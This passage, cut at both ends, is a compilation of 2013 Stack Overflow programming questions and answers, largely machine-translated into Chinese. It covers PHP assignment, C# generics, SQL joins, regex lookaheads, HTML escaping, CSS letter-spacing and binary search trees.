$meta = 'TEST';
$metaAuthor = $metaDescription = $metaImage = $metaTitle = $meta;
echo $metaAuthor."\n"; 
echo $metaDescription."\n";
echo $metaImage."\n";
echo $metaTitle."\n";
echo $meta."\n";
// all variables have now become equal to $meta 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:39:40.697

每种数据类型都是一样的，字符串、整数、数组等都一样。

这里有一个小演示：

[http://sandbox.onlinephpfunctions.com/code/325104e0194b11b98fd7df58953aec4b0deb1468](http://sandbox.onlinephpfunctions.com/code/325104e0194b11b98fd7df58953aec4b0deb1468)

在您的评论中，您可能想要这个：

```
$meta = $metaAuthor." ".$metaDescription." ".$metaImage ." ".$metaTitle; 
```

数组的工作方式如下：

```
$meta = array("author" => $metaAuthor, "description" => $metaDescription );
echo $meta['author']; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:39:40.460

您的代码应该将任何值分配`$meta`给所有其他变量。在 PHP 中，“返回值”或赋值的结果是被赋值的值。只要 $meta 包含某些内容，那么也应该在其他任何地方分配该内容。

例如

```
php > $x = $y = $z = 7;
php > var_dump($x, $y, $z);
int(7)
int(7)
int(7)
php > $a = $b = $c = 'hello';
php > var_dump($a,$b,$c);
string(5) "hello"
string(5) "hello"
string(5) "hello"
php > 
```

# c# - Design Decision -- How to handle ImageList in a Game for good memory management

> ID：15163598
> 
> 赞同：1
> 
> 时间：2013-03-01T17:36:34.333
> 
> 标签：c#, image

I am in the process of building a game.

I have an object GamePiece (there will also be a Card Deck also)

```
public enum PieceColor
{
    Blue=0,
    Yellow,
    Red,
    Green
}

public class GamePiece : PictureBox
{
    PieceColor _color;
    public PieceColor Color {
        get {

            return _color;
        }
        set
        {
            _color = value;

            if (_color == PieceColor.Blue)
                this.Image = global::GameEntities.Properties.Resources.pieceBlue;
        }
    } 
```

What I was thinking is putting four images, one of each color into a ImageList then the above line can be changed to

```
 this.Image = ImageList[(int)_color]; 
```

The problem I foresee with this is that I would be creating a ImageList for every GamePiece and that is a strain on memory.

A couple options would be

*   Create a Static Class of ImageList objects, then have all pieces reference that static class
*   Create one resource bitmap with all 4 pieces on it as one image, then use size manipulation to just show the one piece
*   Leave the code the way it is and just have four different IF statements

So my questions are,

*   Is one solution preferred over the other when it comes to managing memory with the same images used over and over?
*   Is there any Design Patterns when it comes to display images, or any other related Game Concepts that I could study up on?

Thank you

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:43:58.657

创建一个存储图像的单例类并创建获取颜色并返回图像图标的 getImage 方法。

# windows-phone-7 - Which static resources are used for the Windows Phone keyboard

> ID：15163604
> 
> 赞同：0
> 
> 时间：2013-03-01T17:36:49.717
> 
> 标签：windows-phone-7, staticresource

Does anyone knows which (if any) StaticResources are used for the Windows Phone keyboard?

I'm creating my own keyboard (with only numbers, a clear all and a enter/search button) and want it to look like the default keyboard (fontsize, background and border color etc.)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:45:29.250

您需要创建一个自定义控件并按照您需要的方式对其进行整形。您无权访问任何键盘样式。

看看这个人，他从头开始创建了一个键盘：

[http://www.silverlightshow.net/items/Windows-Phone-7-Creating-Custom-Keyboard.aspx](http://www.silverlightshow.net/items/Windows-Phone-7-Creating-Custom-Keyboard.aspx)

# c# - 从 MongoDB 中过滤图像集

> ID：15163607
> 
> 赞同：0
> 
> 时间：2013-03-01T17:36:55.740
> 
> 标签：c#, mongodb, mongodb-.net-driver, mongodb-query

我已经编写了一些代码来在 MongoDB 中存储图像文件。现在我想从 mongoDB 中过滤和检索一些图像。我想过滤掉一些图像名称上有一些字符集的图像。例如：假设我在 mongoDB 中存储了 aaaa_DEX.jpg、bbbb_DEX.jpg、cccc_BVX.jpg、dddd_OUI.jpg、eeee_DEX.jpg 图像，我想获取所有名称上带有“DEX”的图像。查询生成器可以吗？我怎样才能做到这一点？

要上传我使用：

```
public JsonResult UploadPrimaryImage(string hotelCode)
{
    var db = _hoteldbObj.Instance();
    var primaryImageBucket = new MongoGridFS(db, new MongoGridFSSettings() {Root = "HotelPrimaryImage"});

    foreach (string httpFile in Request.Files)
    {
        var postedFile = Request.Files[httpFile];

        if(postedFile == null)
            throw new InvalidOperationException("Invalid file");

        var bytes = ReadToEnd(postedFile.InputStream);

        using (var c = primaryImageBucket.Create(hotelCode, new MongoGridFSCreateOptions() { ContentType = postedFile.ContentType }))
        {                    
            c.Write(bytes, 0, bytes.Length);
            c.Flush();
            c.Close();
        }
    }

    return new JsonResult();
} 
```

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T14:15:55.477

如果查询完整的文件名，则执行 .find("ABC") （其中 ABC 是您的文件名）将处理此问题。

如果您想查询文件名中的子字符串，我的建议是将子字符串保存为元数据对象的一部分。[有关使用元数据的示例，](https://stackoverflow.com/questions/10281610/query-on-mongodb-gridfs-metadata-java)请参阅这篇文章。

# java - 将“<”和“>”替换为“<”和“>”

> ID：15163608
> 
> 赞同：2
> 
> 时间：2013-03-01T17:36:57.920
> 
> 标签：java, android

如果它不是 html 标签的一部分，我`<`想替换`>`它。输入将是一个可能包含某些 html 标签的字符串。它还可以包含小于和大于符号 (">" "<")。例如：`&lt;``&gt;`

```
String example1 = "-> <b> Bold </b> <-";
String example2 = "< <i> Italic </i> >"
String example3 = "<i>foo >> </i>" 
```

作为输出我想得到：

```
String output1 = "-&gt; <b> Bold </b> &lt;-";
String output2 = "&lt; <i> Italic </i> &gt;";
String output3 = "<i>foo &gt;&gt; </i>"; 
```

所以`replaceAll`不起作用，我猜我必须使用正则表达式匹配。有任何想法吗？还有什么办法？

**注意 1：**由于某些项目要求，不能选择第 3 方库。
**注意 2：**我们只支持 HTML 标记的子集（文本样式标记：斜体、下划线、粗体等）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:51:58.323

这是一项艰巨的任务。HTML 不是常规语言（也许它是不规则的？），因此您无法使用正则表达式对其进行解析。我建议如下：

## 选项1

如果您不需要保留空白，请使用此选项。

1.  从输入中删除所有空格。
2.  使用“<”和“>”作为分隔符将输入拆分为标记；保留分隔符。
3.  流程如下：
    1.  如果令牌不是受支持的 HTML 标记并且包含“<”，请根据需要转换“<”。
    2.  如果令牌不是受支持的 HTML 标记并且包含“>”，请根据需要转换“>”。
    3.  传递 HTML 标记不变。

## 选项 2

使用多字符前瞻处理每个输入行。

对于输入中的每个字符。转换字符有 {">", "<"}

1.  字符是否为转换字符。
2.  如果否，则前进到下一个字符。
3.  如果是，请提前确定这是否是受支持的 HTML 标记（这是棘手的部分）。
4.  如果不是受支持的 HTML 标记的一部分，则转换字符。
5.  如果是受支持的 HTML 标记的一部分，则前进到 HTML 标记之后的字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:40:11.407

如果您不介意使用外部库，那么您需要创建一个包含所有 html 标签的数组并针对字符串运行它。

我真的不推荐它，因为有图书馆...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-02T09:53:00.713

如果您只支持五个 html 标签，您可以先从文本中删除这些标签。将 < 和 > 替换为 < 和 >，然后再次添加 html 标签。您可以`remove`通过将文本替换为例如 [b] 来从文本中 <b>。对其他标签执行相同操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T17:44:35.163

假设任意 HTML 文件，您必须隔离文本节点并`replace`在这些节点上运行。

如果你不能使用现有的库，我会自己写。

（JSoup 可以做到这一点，但它是一个“外部库”——也就是说，不包含在 Java SE 标准中，但只是重新实现它是一种选择。）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T19:08:46.610

假设字符串包含有效的`HTML tags`. 可以应用以下方法来解析字符串以实现您寻找的结果：

```
private static String parse(String str)
{
    StringBuilder sBuilder = new StringBuilder();
    for (int i = 0 ; i < str.length() ; i++)
    {
        char ch = str.charAt(i);
        if (ch == '>' && i != 0)
        {
            char c = str.charAt( i - 1);
            if (Character.isWhitespace(c) || !Character.isLetter(c))
            {
                sBuilder.append("&gt;");
            }
            else
                sBuilder.append(ch);
        }
        else if (ch == '>' && i==0)
        {
            sBuilder.append("&gt;");
        }
        else if (ch == '<' && i < str.length() - 1)
        {
            char c = str.charAt( i + 1);
            if (!(c=='/' || Character.isLetter(c)))
            {
                sBuilder.append("&lt;");
            }
            else
                sBuilder.append(ch);
        }
        else if (ch == '<' && i == str.length() - 1)
        {
            sBuilder.append("&lt;");
        }
        else
        {
            sBuilder.append(ch);
        }
    }
    return sBuilder.toString();
} 
```

# perl - 如何在其他列之间插入一列（Perl Spreadsheet::WriteExcel）

> ID：15163611
> 
> 赞同：4
> 
> 时间：2013-03-01T17:37:03.713
> 
> 标签：perl, excel, spreadsheet

假设我有以下电子表格，可以在 perl 中解析，如下所示：

![在此处输入图像描述](../Images/fab0232dd764ad19f794a362df75a6cc.png)

我想在 Column1 和 Column2 之间插入一列。所以最终结果如下所示：

![在此处输入图像描述](../Images/f7da2659c24417f00a1d7da325f35a7d.png)

Spreadsheet-WriteExcel 中似乎没有为此设置的方法。

有谁知道在 Perl 中这样做的简单方法？

提前谢谢了！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T18:02:53.180

唯一（*）`Spreadsheet::WriteExcel`可以做的就是编写电子表格。它没有任何读取现有电子表格的工具。使用它来修改现有的电子表格将涉及首先使用其他方法（如`Spreadsheet::ParseExcel`）读取它，然后以您想要的方式使用数据编写一个全新的电子表格。请注意，如果您尝试此操作，您将丢失宏、图表和任何其他`Spreadsheet::WriteExcel`不支持的功能。

的文档`Spreadsheet::WriteExcel`涵盖了许多替代方案。见[`WRITING EXCEL FILES`](http://search.cpan.org/perldoc?Spreadsheet%3a%3aWriteExcel#WRITING_EXCEL_FILES)和[`MODIFYING AND REWRITING EXCEL FILES`](http://search.cpan.org/perldoc?Spreadsheet%3a%3aWriteExcel#MODIFYING_AND_REWRITING_EXCEL_FILES)部分。`Win32::OLE`例如，让您可以完全访问 Excel 的内部结构，并具有您期望从 Microsoft API 获得的所有功能和易用性。我将由您来判断这些方法中的任何一种是否符合“简单”的条件。

(*) - 我的意思不是坏的。可以编写电子表格的 Perl 模块非常酷。

# c# - Displaying word doc in browswe using asp.net and c#

> ID：15163612
> 
> 赞同：0
> 
> 时间：2013-03-01T17:37:05.077
> 
> 标签：c#, asp.net

Ok so basically i want to display a word doc in the browser as readyonly no editing required access from file and display.... im not particular about it being a word doc but i want the display to inherit text formatting and maybe even include pics if possible. I have currently used the following set of code

```
protected void Page_Load(object sender, EventArgs e)
        {
            if (Session["Link"] != null)
            {
                String link = Session["Link"].ToString();
                ApplicationClass appClass = new ApplicationClass();
                object missing = System.Reflection.Missing.Value;
                object visible = true;
                object readOnly = true;
                object fileName = link;
                Document wordDoc = appClass.Documents.Open(ref fileName, ref missing, ref readOnly, ref missing, ref missing, ref missing, ref missing, ref missing, ref missing, ref missing, ref visible, ref missing, ref missing, ref missing, ref missing, ref missing);
            TextArea1.InnerText = wordDoc.Content.Text;

            appClass.Application.Quit(ref missing, ref missing, ref missing);

        }
        else
        {
            DataSet ds = new DataSet();
            ds = WCGSQL.showdata("select max(Date) from WeeklyMsg");
            if (ds != null)
            {
                String MaxDate = ds.Tables[0].Rows[0][0].ToString();
                ds = WCGSQL.showdata("select * from WeeklyMsg where Date='" + MaxDate + "'");
                String link = ds.Tables[0].Rows[0][0].ToString();
                String Path = "i:\\Website/WebSite3/WMSG/" + link;
                ApplicationClass appClass = new ApplicationClass();
                object missing = System.Reflection.Missing.Value;
                object visible = true;
                object readOnly = true;
                object fileName = Path;
                Document wordDoc = appClass.Documents.Open(ref fileName, ref missing, ref readOnly, ref missing, ref missing, ref missing, ref missing, ref missing, ref missing, ref missing, ref visible, ref missing, ref missing, ref missing, ref missing, ref missing);

                TextArea1.InnerText = wordDoc.Content.Text;

                appClass.Application.Quit(ref missing, ref missing, ref missing);
            }
        }
    } 
```

Which worked file for an asp website but when i use it on a asp web app it give me the following error

```
Error   2   Task could not find "AxImp.exe" using the SdkToolsPath "C:\Program Files\Microsoft SDKs\Windows\v7.0A\bin\NETFX 4.0 Tools\" or the registry key "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SDKs\Windows\v7.0A". Make sure the SdkToolsPath is set and the tool exists in the correct processor specific location under the SdkToolsPath and that the Microsoft Windows SDK is installed   WebApplication2 
```

really open to any ideas that can fix this even external apps (it would be best if it is free creating site for non profit org so got a really limited budget)

thx in advance Mark

# html - 为什么嵌套的内联元素和后面的字符之间没有字母间距？

> ID：15163613
> 
> 赞同：6
> 
> 时间：2013-03-01T17:37:09.367
> 
> 标签：html, css

在阅读了字母间距规范后，我了解到原子内联（前内联块）元素的运行被视为单个字符（[http://www.w3.org/TR/css3-text/#letter-spacing](http://www.w3.org/TR/css3-text/#letter-spacing) ):

> 出于字母间距的目的，原子内联（例如图像和/或内联块）的每个连续运行都被视为单个字符。

在我测试的所有浏览器（Chrome、Safari、Firefox、IE 9+10）中，它似乎都不是这样工作的。

以下代码（[http://codepen.io/caleb/pen/CqDfK](http://codepen.io/caleb/pen/CqDfK)）：

```
<style>
    div { letter-spacing: 2em; }
    em { letter-spacing: normal; }
</style>
<div>
    a<em>em</em><em>em</em>bc
</div> 
```

呈现为：

```
a    ememb    c 
```

有没有理由在`emem`和之间没有额外的 2em 间距`b`？由于`emem`是单个字符。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T20:43:01.577

也许您评论的规范似乎没有完全实施，但我不确定。当我从[规范](http://www.w3.org/TR/css3-text/#letter-spacing)中放入示例的修改版本时（修改为我制作了所有内部元素`em`并更改了大小以更好地查看；下面括号中引用的更改）...

> 例如，给定标记
> 
> ```
> <P>a<LS>b<Z>cd</Z><Y>ef</Y></LS>g</P> 
> ```
> 
> 和样式表
> 
> ```
> LS [em] { letter-spacing: 1em; } 
> 
> Z [em > em] { letter-spacing: 0.3em; [made 3em in example] }
> 
> Y [em > em + em] { letter-spacing: 0.4em; [made 6em in example]} 
> ```
> 
> 间距是
> 
> ```
> a[0]b[1em]c[0.3em]d[1em]e[0.4em]f[0]g 
> ```

...它[不会根据他们所说的进行渲染](http://codepen.io/anon/pen/hEgHc)，这意味着规范有一些变化。相反，*似乎*遵循的规则是*前一个*字母的`letter-spacing`值决定了它后面的空格。这可能是基于对规范中此语句的解释的实现：

> *在元素边界处，两个字符之间的总字母间距由包含* 边界的最里面的元素给出并呈现在其中。

但我不确定。无论如何，遵循*浏览*器使用的规则，*前一个*字母的`letter-spacing`值决定了间距，那么***这就解释了你的问题***的答案

> emem和b之间没有额外的2em间距有什么原因吗？

这是因为前面的字母`b`包含`m`在编码元素中，它*后面*`letter-spacing: normal`的宽度为零。我不相信参考...

 *> 出于字母间距的目的，原子内联（例如图像和/或内联块）的每次连续运行都被视为单个字符

……有很大关系。这只是表明这种“原子内联”作为一个单元起作用，并且`em`默认情况下不是原子内联（[参见本规范中 9.2.2 的第二段](http://www.w3.org/TR/CSS2/visuren.html#inline-boxes)）。所以在[这个例子](http://codepen.io/anon/pen/gqalm)`width`中，`inline-block`元素的 决定了的放置位置，而不是现在恰好在*之后*的`g`事实，因为整个块作为一个原子单元运行。`f`*`g`**

# sql - 当我只想要一行时，SQL JOIN 返回多行

> ID：15163615
> 
> 赞同：3
> 
> 时间：2013-03-01T17:37:12.847
> 
> 标签：sql, join

我的大脑一天很慢...

我加入的表：

**政策办公室：**

```
 PolicyNumber    OfficeCode
      1             A
      2             B
      3             C
      4             D
      5             A 
```

**办公信息：**

```
 OfficeCode      AgentCode      OfficeName
      A             123             Acme 
      A             456             Acme
      A             789             Acme
      B             111             Ace
      B             222             Ace
      B             333             Ace
     ...            ...             .... 
```

我想执行搜索以返回与办公室名称相关的所有政策。例如，如果我搜索“Acme”，我应该得到两个策略：1 和 5。

我当前的查询如下所示：

```
SELECT
   *
FROM
   Policy_Office P
   INNER JOIN Office_Info O ON P.OfficeCode = O.OfficeCode
WHERE
   O.OfficeName = 'Acme' 
```

但是这个查询返回多行，我知道这是因为第二个表中有多个匹配项。

如何编写查询以仅返回两行？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T17:40:16.177

```
SELECT  DISTINCT a.PolicyNumber
FROM    Policy_Office a
        INNER JOIN Office_Info b
            ON a.OfficeCode = b.OfficeCode
WHERE   b.officeName = 'Acme' 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/79ffa/1)

要进一步了解有关联接的更多信息，请访问以下链接：

*   [SQL 连接的可视化表示](http://www.codeproject.com/Articles/33052/Visual-Representation-of-SQL-Joins)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-01T17:42:04.480

简单连接返回两组的笛卡尔乘法，第一个表中有 2 A，第二个表中有 3 A，您可能会得到 6 个结果。如果您只想要保单编号，那么您应该对其进行区分。

# c# - 检查字符串是否有多个子字符串的正则表达式

> ID：15163616
> 
> 赞同：0
> 
> 时间：2013-03-01T17:37:15.230
> 
> 标签：c#, regex

如果我需要检查字符串是否具有某些值，正则表达式会是什么样子

例如，它应该从以下字符串中提取 Duration 量（时间跨度），但前提是源字符串包含 all`Duration`和`start`子`bitrate`字符串

```
Duration: 00:04:19.39, start: 0.157967, bitrate: 15636 kb/s 
```

像这样的行应该被忽略：

```
Duration: 00:04:19.39, bitrate: 15636 kb/s
start: 0.157967, bitrate: 15636 kb/s
Duration: 00:04:19.39, start: 0.157967 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:40:23.413

由于您正在进行数据提取，我将使用这个简单的正则表达式：

```
^(?=.*start:)(?=.*bitrate:).*Duration: ([\d.:]+) 
```

时间戳可以在第一个捕获组中找到。

数据似乎是从程序日志生成的，所以我假设间距是规则的。我的正则表达式将忽略源字符串中的`start`,`bitrate`和的顺序。`Duration`如果您想要不区分大小写的匹配，请打开该标志。

忽略排序将使正则表达式在长字符串上变慢。我们拥有的假设越多（尤其是关于排序的假设），正则表达式就越好。

**解释**

```
^
(?=.*start:)
(?=.*bitrate:)
.*Duration: ([\d.:]+) 
```

`^`锚定字符串的开头。我出于性能原因添加了这个，因为如果正则表达式引擎已经详尽地回溯了所有案例并且没有找到匹配项，则无需检查匹配项。

`(?=.*start:)`零宽度正前瞻。它将尝试`.*start:`从字符串中的当前位置匹配，如果找到则从它离开的位置继续匹配，如果没有找到则停止。它被称为*零宽度*，因为它实际上并不消耗字符串，而不是正则表达式的这一部分`.*Duration: ([\d.:]+)`。

`(?=.*bitrate:)`，和上面一样，检查`bitrate:`字符串中是否有前面。

`.*Duration: ([\d.:]+)`与实际时长相符。我不关心格式，因为我假设你得到的任何东西都是正确的，所以我只抓住最长的数字序列`\d`,`.`和`:`.

当字符串中有多个匹配项时，*使用字符*的概念很重要。有时，您想在决定操作之前检查字符串是否包含某个序列。这样的检查不应该*消耗 character*，因为当您还没有处理当前位置的文本时，您不应该处理前面的文本。如果您使用文本，那么您可能会丢失文本中从当前位置到字符串中前面的文本的一些匹配项。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T17:40:23.683

您想要的是一个匹配整个字符串的表达式，并为您要提取的部分捕获组，例如：

```
@"Duration: (\d{2}:\d{2}:\d{2}.\d{2}), start: \d+(.\d+)?, bitrate: \d+ kb/s" 
```

包围您的`()`匹配组（`Duration`您要读取的值）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:47:56.700

如果格式和顺序始终相同，则单纯形正则表达式可能是这样的：

```
Duration: (.*), start: .*, bitrate: .* 
```

# c# - 使用更具体的方法从抽象基础继承

> ID：15163617
> 
> 赞同：0
> 
> 时间：2013-03-01T17:37:16.600
> 
> 标签：c#, generics, inheritance, overriding

这些关键词有很多问题；我筛选了前30个左右然后放弃了。

我有这样的接口：

```
public interface IColumnRule
{
    int Length { get; set; }
    string Name { get; set; }
    object Parse(string toParse);
    int Position { get; set; }
    Type Type { get; }
}

public interface IColumnRule<T> : IColumnRule
{
    ColumnRule<T>.RuleFluentInterface<T> Configure { get; }
    new T Parse(string rowdata);
    Func<string, T> ParsingFunction { get; set; }
} 
```

...这个想法是，一个人将实现`IColumnRule<T>`创建一个强类型的列解析器，利用`Func<string, T>`.

问题是，我将这些`IColumnRule<T>`混凝土存放在一个`IList<IColumnRule>`容器中。有多种类型`IColumnRule<T>`，每种都在不同的类型上实现。当我`Parse`在接口上调用方法时`IColumnRule`，我期望`new Parse(string)`调用子类的方法，但`Parse`实际调用的是基类。

如何从使用接口的`T Parse(string)`集合中调用子类泛型方法......或者这是不可能的？`IColumnRule``object Parse(string)`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:43:03.017

您的实现`IColumnRule<T>`必须提供兼容的`Parse`方法。给定您的代码，最简单的方法是在您的基类中使用受保护的抽象方法，该方法在您的子类中被覆盖。

```
public abstract class ColumnRule : IColumnRule
{
    ...

    public object Parse(string rowdata)
    {
        return this.ParseInternal(rowdata);
    }

    protected abstract object ParseInternal(rowdata);
}

public class ColumnRule<T> : ColumnRule, IColumnRule<T>
{
    ...

    public new T Parse(string rowdata)
    {
        // strong-typed parse method
    }

    protected override object ParseInternal(string rowdata)
    {
        return this.Parse(rowdata); // invokes strong-typed method
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:41:29.197

> 当我在 IColumnRule 接口上调用 Parse 方法时，我期望调用子类的新 Parse(string) 方法，但实际调用的是基本 Parse 方法。

是的，它会的。就类型系统、CLR 和编译器而言，您有两种*无关的方法。*

> 如何使用接口的对象 Parse(string) 从 IColumnRule 集合中调用子类泛型 T Parse(string) 方法......或者这是不可能的？

最简单的方法是有一个抽象类将其实现为：

```
public abstract ColumnRuleBase<T> : IColumnRule<T>
{
    public object Parse(string toParse)
    {
        IColumnRule<T> genericThis = this;
        return genericThis.Parse(toParse);
    }

    ...
} 
```

（如果你有两个不同的方法名称，它会稍微简单一些。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:41:29.987

你必须以某种方式知道类型：

```
List<IColumnRule> rules;  // populated from somewhere

foreach (IColumRule<int> rule in rules.OfType<IColumnRule<int>>()) {
    int foo = rule.Parse(rowData);
} 
```

或者只是转换一个已知元素：

```
int foo = ((IColumnRule<int>)rules[5]).Parse(rowData); 
```

# php - 使用 array() 在 codeigniter 中加载多个库。第一个图书馆有效，但第二个图书馆无效

> ID：15163618
> 
> 赞同：2
> 
> 时间：2013-03-01T17:37:18.063
> 
> 标签：php, codeigniter

我正在从我的主控制器中加载两个控制器，并且只加载第一个。

```
class App extends CI_Controller {

    public function index() {
        $this->load->library(array('../controllers/effects', 
                             '../controllers/ingredients'));
        $data['ingredients'] = $this->ingredients->get_all();
        $data['effects'] = $this->effects->get_all();

        $this->load->view('header');      
        $this->load->view('main', $data);
        $this->load->view('footer');

    }
} 
```

我得到了错误`Message: Undefined property: App::$ingredients`。如果我像这样切换两个路径字符串

```
$this->load->library(array('../controllers/ingredients', '../controllers/effects')); 
```

然后它说效果是未定义的，所以看起来它总是加载第一个控制器而不是第二个。我也尝试过自动加载它们，但出现“超出嵌套函数限制”之类的错误。我做错了什么，我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-02T03:43:54.887

将您的库文件放在里面的文件`libraries`夹中`CI`

现在您可以在控制器中加载您的库

```
$this->load->library('library_name'); 
```

在数组中加载多个库

```
$this->load->library(array('library_name_1', 'library_name_2')); 
```

或者您可以在 config/autoload.php 中自动加载库

```
$autoload['libraries'] = array('library_name_1', 'library_name_2'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T21:02:48.543

您应该遵循手册中有关[库](http://ellislab.com/codeigniter/user-guide/general/libraries.html)的内容。

您应该将库文件放在库文件夹中并使用

> $this->load->library('name');

# data-structures - 为什么只将数据存储在平衡二叉搜索树的叶节点中？

> ID：15163623
> 
> 赞同：9
> 
> 时间：2013-03-01T17:37:26.980
> 
> 标签：data-structures, binary-search-tree, computational-geometry

我买了一本关于计算几何的不错的小书。在这里和那里阅读它时，我经常偶然发现这种特殊类型的二叉搜索树的使用。这些树是平衡的，应该只将数据存储在叶节点中，而内部节点应该只存储值以引导搜索到叶节点。

下图显示了这种树的一个示例（其中叶子是矩形，内部节点是圆形）。

![二叉搜索树的插图](../Images/9101db798ed420fe101c3506e0842aad.png)

我有两个问题：

1.  不在内部节点中存储数据有什么好处？

2.  出于学习的目的，我想实现这样一棵树。因此，我认为使用 AVL 树作为基础可能是个好主意，但这是个好主意吗？

非常欢迎任何有用的资源。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T18:59:33.250

> 不在内部节点中存储数据有什么好处？

根据设计，有些树数据结构要求内部节点中不存储任何数据，例如[Huffman 代码树](http://en.wikipedia.org/wiki/Huffman_tree)和[B+ 树](http://en.wikipedia.org/wiki/B+_tree)。在霍夫曼树的情况下，要求没有两个叶子具有相同的前缀（即到节点'A'的路径是101，而到节点'B'的路径是10）。在 B+ 树的情况下，它来自于它针对块搜索进行了优化（这也意味着每个内部节点都有很多子节点，并且树通常只有几层深）。

> 出于学习的目的，我想实现这样一棵树。因此，我认为使用 AVL 树作为基础可能是个好主意，但这是个好主意吗？

当然！AVL 树并不是非常复杂，因此它是一个很好的学习候选者。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T20:03:07.857

其他类型的二叉树在叶子而不是内部节点处具有数据是很常见的，但对于二叉搜索树来说却相当少见。

您可能想要这样做的一个原因是教育 - 以这种方式实现二叉搜索树通常比传统方式更容易。为什么？几乎完全是因为删减。删除叶子通常很容易，而删除内部节点则更难/更麻烦。如果您的数据仅在叶子上，那么您总是很容易！

值得思考的是内部节点上的键是从哪里来的。通常它们是位于叶子（带有数据）的键的副本。稍后，如果叶子节点的键被删除，内部节点的键可能仍然会挂起。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T18:40:53.627

> 不在内部节点中存储数据有什么好处？

一般来说，不将数据存储在内部节点中没有任何**优势**。例如，[红黑树](http://en.wikipedia.org/wiki/Red-black_tree)是平衡树，它将其数据存储到内部节点和叶节点中。

> 出于学习的目的，我想实现这样一棵树。因此，我认为使用 AVL 树作为基础可能是个好主意，但这是个好主意吗？

在我看来，确实如此。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-07-27T00:46:51.483

我正在阅读同一本书，他们说这可以通过任何一种方式完成，数据存储在外部或内部节点。

他们使用的树是红黑的。

无论如何，这里有一篇文章将数据存储在红黑树的内部节点上，然后将这些数据节点链接在一起作为一个列表。

Arjan van den Boogaard 在 C++ 中具有双向链表的平衡二叉搜索树

[http://archive.gamedev.net/archive/reference/programming/features/TStorage/default.html](http://archive.gamedev.net/archive/reference/programming/features/TStorage/default.html)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-03-01T19:06:45.237

仅将数据保存在叶节点（例如 B+ 树）中的一个好处是扫描/读取数据非常简单。叶节点链接在一起。因此，当您位于给定叶节点内数据的“末端”（右侧或左侧）时，要读取下一项，您只需读取指向下一个（或上一个）节点的链接/指针并跳转到下一个叶页.

对于每个节点中都有数据的 B 树，您必须遍历树才能按顺序读取数据。这当然是一个定义明确的过程，但可以说更复杂，通常需要更多的状态信息。

# javascript - 如何通过用户 ID 从 flickr 获取集合列表？

> ID：15163625
> 
> 赞同：0
> 
> 时间：2013-03-01T17:37:34.033
> 
> 标签：javascript, jquery, json, jsonp, flicker

我正在使用 flicker jquery 插件，我需要通过用户 ID 获取用户的集合列表。我在 flicker API 中进行了搜索，但没有为该任务找到任何服务，但我知道这是可能的。

在插件中我有这个功能：

```
 set: function( photoset_id, callback ) {
        return this._find({
            photoset_id: photoset_id,
            method: 'flickr.photosets.getPhotos'
        }, callback);
    } 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T18:27:46.203

我认为您正在寻找的 API 方法是 flickr.photosets.getList 在这里找到：http: [//www.flickr.com/services/api/flickr.photosets.getList.html](http://www.flickr.com/services/api/flickr.photosets.getList.html)

如果您正在寻找其他库来试用，Temboo SDK 包含这个 flickr 方法，它适用于 Android、iOS、Java、Node.js、PHP、Python 和 Ruby。

这是 Temboo 上此 Flickr 方法的链接以对其进行测试： [https ://live.temboo.com/library/Library/Flickr/PhotoSets/GetList/](https://live.temboo.com/library/Library/Flickr/PhotoSets/GetList/)

（全面披露：我在 Temboo 工作）

# java - Java Graphics 不在底部和右侧绘制

> ID：15163627
> 
> 赞同：1
> 
> 时间：2013-03-01T17:37:34.807
> 
> 标签：java, swing, graphics, jpanel, paint

为什么这不渲染底部和右侧。我如何解决它？有一个小的白色区域，没有任何东西被绘制？我确信有一个简单的解决方法，但我太愚蠢了。

我已经摆脱了任何不必要的东西，但可能仍然有一些随机无用的代码。

```
package test;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Graphics2D;
import javax.swing.JFrame;
import javax.swing.JPanel;

public class Test extends JPanel implements Runnable
{
    /**
     * Default serial version
     */
    private static final long serialVersionUID = 1L;

    private static final int WIN_WIDTH = 760;
    private static final int WIN_HEIGHT = 480;

    private boolean running;
    private Thread thread;
    public Graphics g;
    public Graphics2D g2d;
    static final int UPDATE_RATE = 60;
    static final long UPDATE_PERIOD = 1000000000L / UPDATE_RATE;

    static public final int EONWIDTH = 24;
    static public final int EONHEIGHT = 24;

    /**
     * Contains a list of Eon instances by their instance ID.
     */

    ///////////////////////////////////CONSTRUCTER/////////////////////////////
    public Test()
    {
        Dimension size = new Dimension(WIN_WIDTH, WIN_HEIGHT);
        setPreferredSize(size);
        setMinimumSize(size);
        setMaximumSize(size);       
    }

    /**
